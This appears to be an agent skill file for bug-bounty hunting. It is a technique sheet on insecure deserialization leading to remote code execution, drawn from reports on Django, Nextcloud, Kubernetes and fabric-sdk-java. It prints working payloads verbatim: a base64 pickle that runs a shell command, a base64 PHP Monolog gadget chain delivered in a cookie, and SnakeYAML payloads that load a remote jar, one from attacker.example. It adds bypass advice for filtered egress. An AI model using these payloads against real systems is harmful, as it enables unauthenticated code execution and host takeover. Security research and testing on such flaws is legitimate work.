---
name: hunter-l3-insecure-deserialization-rce
description: "Use when hunting Insecure Deserialization (RCE) on a target. Loads the L3 technique sheet: This class covers server-side deserialization of attacker-controlled data — pickle (Python), unserialize (PHP), and SnakeYAML (Java) — where untrusted input is turned directly into code execution."
domain: cybersecurity
subdomain: web
tags:
- web
- insecure-deserialization-rce
- hunting
- l3
version: '1.0'
---

# Insecure Deserialization (RCE) — Technique Sheet

## Overview
This class covers server-side deserialization of attacker-controlled data — pickle (Python), unserialize (PHP), and SnakeYAML (Java) — where untrusted input is turned directly into code execution. It pays when an app feeds user input (cookies, cache stores, config files, API bodies) into a deserializer without a safe constructor or type whitelist. All four records here resulted in proven RCE on production hosts, typically unauthenticated.

## Distinct sub-patterns

### Sub-pattern 1: Python pickle deserialization of cache values (Django DatabaseCache / Redis cache backend)
- Endpoint shape: Not a single URL — any page served from Django's cache. The backend is `django.core.cache.backends.db.DatabaseCache` (cache table in DB) or the Redis cache backend. Attacker needs any write primitive into the cache store (SQL injection into the cache table, a shared/dev cache instance, misconfigured Redis, or another injection path that lets you set a cache key).
- Parameter: the cached value (the pickled blob stored in the `cache_value` column / Redis key).
- Payload (verbatim):
  `gASVHgAAAAAAAACMAm9zlIwGc3lzdGVtlJOUjAZ3aG9hbWmUhZRSlC4=`
  (base64 pickle; decoded it is `pickle.loads`-friendly bytes that evaluate `os.system('whoami')`.)
- Root cause: Django's database (and Redis) cache backends deserialize cached values with Python pickle on read. Pickle = arbitrary code execution for anyone who can write to the cache.
- Impact proven: The attacker replaced a cached page value in the cache table with the crafted pickle; on the next page reload, `whoami` executed and its output appeared in the server logs — full RCE on the Django server, i.e. machine takeover.
- Exemplar: 1415436 (Django).

### Sub-pattern 2: PHP `unserialize()` on a user-controlled cookie with a Monolog gadget chain
- Endpoint shape: `GET https://nextcloud.com/newsletter/` — any endpoint whose code path calls `unserialize(base64_decode($_COOKIE['nc_form_fields']))`.
- Parameter: cookie `nc_form_fields` (base64-encoded serialized PHP object).
- Payload (verbatim, base64): 
  `TzozNzoiTW9ub2xvZ1xIYW5kbGVyXEZpbmdlcnNDcm9zc2VkSGFuZGxlciI6NDp7czoxNjoiACoAcGFzc3RocnVMZXZlbCI7aTowO3M6MTA6IgAqAGhhbmRsZXIiO3I6MTtzOjk6IgAqAGJ1ZmZlciI7YToxOntpOjA7aToyOntpOjA7czoyOiJpZCI7czo1OiJsZXZlbCI7aToxMDA7fX1zOjEzOiIAKgBwcm9jZXNzb3JzIjthOjI6e2k6MDtzOjM6InBvcyI7aToxO3M6Njoic3lzdGVtIjt9fQ==`
  Decoded, it is a serialized `Monolog\Handler\FingersCrossedHandler` object with the buffer carrying `id` at log level 100 and the processor set to `system` — i.e. the `system('id')` Monolog RCE gadget chain.
- Root cause: `unserialize(base64_decode($_COOKIE['nc_form_fields']))` is called directly on user input in the WordPress instance behind nextcloud.com. PHP object injection via a known gadget chain (Monlog handler → `system()` processor) turns the object graph into command execution.
- Impact proven: Response contained `uid=33(www-data) gid=33(www-data)` — unauthenticated RCE on the nextcloud.com WordPress host.
- Exemplar: 2248328 (Nextcloud).
- Note: The critical enabler is finding an endpoint that unserializes a cookie; the gadget chain itself is standard library/app code (Monolog is bundled with most WordPress installs), so no app-specific gadget is needed.

### Sub-pattern 3: SnakeYAML without SafeConstructor — arbitrary Java class instantiation (server-side API/config)
- Endpoint shape: any service that parses attacker-supplied YAML with `new Yaml()` (default constructor). In the records:
  - A "Dynamics YAML deserialization API" (Kubernetes program) — untrusted YAML supplied to the parser.
  - fabric-sdk-java classes: `ChaincodeCollectionConfiguration.java`, `NetworkConfig.java`, `ChaincodeEndorsementPolicy.java`, `LifecycleChaincodeEndorsementPolicy.java` — network/chaincode config YAML parsed from untrusted input.
- Parameter: the raw YAML document body (API request body or config file input).
- Payloads (verbatim):
  - `!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://localhost:8080/"]]]]`
  - `!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker.example/exploit.jar"]]]]`
  Both instantiate `javax.script.ScriptEngineManager` via a `URLClassLoader` pointed at an attacker-controlled URL; the classloader loads the remote jar and its `ScriptEngineFactory` service provider executes code inside the JVM. The `localhost:8080` variant is a safe, self-contained proof (no external callback needed) — the jar served at that URL carries the malicious factory.
- Root cause: SnakeYAML used without `SafeConstructor` permits `!!`-typed arbitrary class instantiation from untrusted YAML (CVE-2022-1471).
- Impact proven: code execution inside the JVM (record 1807214); RCE via arbitrary Java object instantiation, CVSS 6.9 Medium (record 801370).
- Exemplars: 1807214 (Kubernetes/Dynamics), 801370 (Linux Foundation Decentralized Trust, fabric-sdk-java).

## Bypass / chain notes
- Cache-pickle: no filter bypass needed — the write primitive is the whole chain (e.g. another vuln that lets you UPDATE the Django `cache_table`, or access to the shared Redis). If the target runs Django with DatabaseCache/Redis cache, treat any cache-write primitive as RCE, not just data tampering.
- PHP cookie injection: the exploit is unauthenticated and needs no chain — the cookie itself is the delivery channel. The gadget (`Monolog FingersCrossedHandler` with `system` processor) ships inside the app's own dependencies, so it works wherever Monolog is installed (standard in WordPress/Symfony stacks).
- SnakeYAML: two payload variants seen — a local URL (`http://localhost:8080/`) for self-contained PoCs where the report server hosts the malicious jar locally, and a remote attacker URL (`http://attacker.example/exploit.jar`) for out-of-band execution. If egress is filtered, hosting the jar on an internal address the target can reach is a valid alternative.
- Chain observed in 1807214: attacker supplies untrusted YAML → SnakeYAML (non-safe constructor) instantiates `javax.script.ScriptEngineManager` with attacker-supplied URLClassLoader → code execution in JVM.

## Gotchas / what NOT to do
- Do not assume deserialization sinks are limited to obvious request parameters — check cookies (record 2248328 was a cookie, easy to overlook) and internal stores (cache tables — record 1415436).
- For Django cache pickle, you must first find a way to write to the cache; testing the payload without a cache-write primitive proves nothing. Don't report pickle-in-cache as RCE unless you demonstrated the write.
- For SnakeYAML, verify the parser uses the default (non-safe) constructor — a `new Yaml(new SafeConstructor())` setup blocks the `!!` typed instantiation entirely, and your payload will fail silently or throw.
- The fabric-sdk-java sink lives in library code (`NetworkConfig.java`, `ChaincodeEndorsementPolicy.java`, etc.) — test through the application path that feeds those classes, not the library in isolation.
- Prefer the localhost-jar SnakeYAML variant for in-scope PoCs to avoid out-of-scope external callback infrastructure, but keep the payload semantically identical (same gadget class, same URLClassLoader mechanism).

## Real-world impact examples
- Django (1415436): replaced a cache-table entry with the pickle payload; on page reload `os.system('whoami')` ran and showed up in server logs — full machine takeover of the Django host.
- Nextcloud (2248328): unauthenticated `system('id')` via the `nc_form_fields` cookie returned `uid=33(www-data) gid=33(www-data)` — RCE on the public nextcloud.com WordPress instance.
- Kubernetes/Dynamics (1807214): SnakeYAML CVE-2022-1471 gadget achieved code execution inside the JVM.
- Linux Foundation fabric-sdk-java (801370): RCE via arbitrary Java object instantiation, rated Medium (CVSS 6.9).